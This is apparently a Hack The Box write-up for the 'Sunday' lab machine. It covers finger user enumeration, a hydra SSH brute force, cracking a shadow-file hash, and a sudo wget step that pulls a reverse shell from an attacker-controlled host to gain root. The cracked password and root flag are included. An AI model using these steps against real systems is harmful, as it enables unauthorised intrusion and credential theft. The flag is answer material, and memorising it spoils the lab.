+++
title = "HTB - Sunday"
date = 2024-10-08
+++

### Scan
```

Host is likely running OpenBSD/Cisco/Oracle


PORT    STATE SERVICE
79/tcp  open  finger
111/tcp open  rpcbind
515/tcp open  printer


PORT    STATE SERVICE VERSION
79/tcp  open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq: 
|_    Login Name TTY Idle When Where
111/tcp open  rpcbind 2-4 (RPC #100000)
515/tcp open  printer


PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown


PORT      STATE SERVICE VERSION
6787/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)

```
### Enumeration
finger? - simple network protocols for the exchange of human-oriented status and user information. a relic of a dif time
`finger @10.10.10.76` yields no results, so we can user pentest monkey script for user enum
`./finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.76`
Only users with valid IP are sunny and sammy<img alt="Image" async src="images/Screenshot 2024-10-08 at 4.57.28 PM.png" width="800px"></img>
We can brute force ssh with hydra and rockyou (or be big brain and use box name)`sunday`
`hydra -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 -s 22022 ssh`
<img alt="Image" async src="images/Screenshot 2024-10-08 at 5.03.15 PM.png" width="800px"></img>
SSH in with `ssh sunny@10.10.10.76 -p 22022`
### Priv Esc
root troll priv as sunny?
go to root directory, and go to backup dir. thats not usually there boxo
we find shadow backup and cat it <img alt="Image" async src="images/Screenshot 2024-10-08 at 5.07.19 PM.png" width="800px"></img>
see user sammy hash to crack. (no root, come back later)
`john --wordlist=/usr/share/wordlists/rockyou.txt sammy.hash`
`cooldude!`<img alt="Image" async src="images/Screenshot 2024-10-08 at 5.12.04 PM.png" width="800px"></img>
ssh to sammy
sudo wget priv as sammy
lets use wget on sammy to overwrite root troll and run it as sunny.
create a reverse py shell (pentest monkey )
serve with py server and overwrite w wget
`sudo wget http://10.10.14.11:8000/tmp.py -0 /root/troll`
<img alt="Image" async src="images/Screenshot 2024-10-08 at 5.21.53 PM.png" width="800px"></img>
Then, quickly (5s), execute `sudo /root/troll` as sunny. If your listener is set up, you'll get root.
The script is rewritten every 5 seconds, so be quick!<img alt="Image" async src="images/Screenshot 2024-10-08 at 5.32.10 PM.png" width="800px"></img>
ROOT:a50977c381dd35e6a1ee3ee5e7041ce4